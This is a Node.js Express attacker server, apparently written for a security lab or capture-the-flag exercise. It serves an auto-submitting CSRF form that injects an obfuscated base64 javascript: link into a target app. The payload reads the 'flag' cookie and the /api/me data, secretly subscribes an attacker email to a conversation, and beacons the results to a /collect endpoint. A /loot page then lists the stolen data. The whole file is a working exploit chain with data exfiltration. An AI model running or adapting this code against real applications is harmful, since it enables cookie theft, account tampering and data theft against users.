const express = require("express");

const app = express();
const port = Number(process.env.PORT || 4000);
const loot = [];

app.use(express.text({ type: "*/*", limit: "1mb" }));

function escapeHtml(value) {
  return String(value)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#39;");
}

function escapeAttribute(value) {
  return escapeHtml(value).replaceAll("\n", "&#10;").replaceAll("\r", "&#13;");
}

function webhookFromQuery(value) {
  if (!value) {
    return "http://attacker:4000/collect";
  }

  let parsed;
  try {
    parsed = new URL(value);
  } catch {
    return null;
  }

  if (!["http:", "https:"].includes(parsed.protocol)) {
    return null;
  }

  return parsed.toString();
}

function buildPayload(webhook) {
  const payload = `
void (async () => {
  const flagCookie = document.cookie
    .split("; ")
    .find((part) => part.startsWith("flag=")) || "";
  const flag = flagCookie.startsWith("flag=") ? flagCookie.slice("flag=".length) : "";
  let me = null;

  try {
    me = await fetch("/api/me", { credentials: "same-origin" }).then((response) => response.json());
  } catch (error) {
    me = { error: "api-me-failed" };
  }

  try {
    await fetch("/api/conversations/latest/subscribers", {
      method: "POST",
      credentials: "same-origin",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email: "attacker@example.test" })
    });
  } catch (error) {
  }

  const body = JSON.stringify({
    cookie: flagCookie,
    flag,
    me
  });

  try {
    if (navigator.sendBeacon && navigator.sendBeacon(${JSON.stringify(webhook)}, body)) {
      return;
    }
  } catch (error) {
  }

  try {
    await fetch(${JSON.stringify(webhook)}, {
      method: "POST",
      mode: "no-cors",
      body
    });
  } catch (error) {
  }
})();
`;

  return `javascript:eval(atob('${Buffer.from(payload, "utf8").toString("base64")}'))`;
}

app.get("/lab", (req, res) => {
  const webhook = webhookFromQuery(req.query.webhook);
  if (!webhook) {
    res.status(400).type("text/plain").send("invalid webhook URL");
    return;
  }

  const href = buildPayload(webhook);
  const greeting = `[open details](${href})`;
  const appOrigin = req.hostname === "attacker.security-lab.test"
    ? "http://app.security-lab.test:3000"
    : "http://app:3000";

  res.type("html").send(`<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Lab</title>
</head>
<body>
  <form id="csrf" method="post" action="${appOrigin}/help/search">
    <input type="hidden" name="query" value="test">
    <input type="hidden" name="greeting" value="${escapeAttribute(greeting)}">
  </form>
  <script>
    document.getElementById("csrf").submit();
  </script>
</body>
</html>`);
});

app.post("/collect", (req, res) => {
  const body = typeof req.body === "string" ? req.body : JSON.stringify(req.body);
  loot.push({
    at: new Date().toISOString(),
    body
  });
  res.type("text/plain").send("ok");
});

app.get("/loot", (req, res) => {
  if (loot.length === 0) {
    res.type("text/plain").send("no loot");
    return;
  }

  const lines = [];
  for (const item of loot) {
    lines.push(`# ${item.at}`);
    try {
      const parsed = JSON.parse(item.body);
      if (parsed.cookie) {
        lines.push(parsed.cookie);
      }
      if (parsed.flag) {
        lines.push(`flag=${parsed.flag}`);
      }
      lines.push(JSON.stringify(parsed, null, 2));
    } catch {
      lines.push(item.body);
    }
    lines.push("");
  }

  res.type("text/plain").send(lines.join("\n"));
});

app.listen(port, () => {
  console.log(`attacker listening on ${port}`);
});
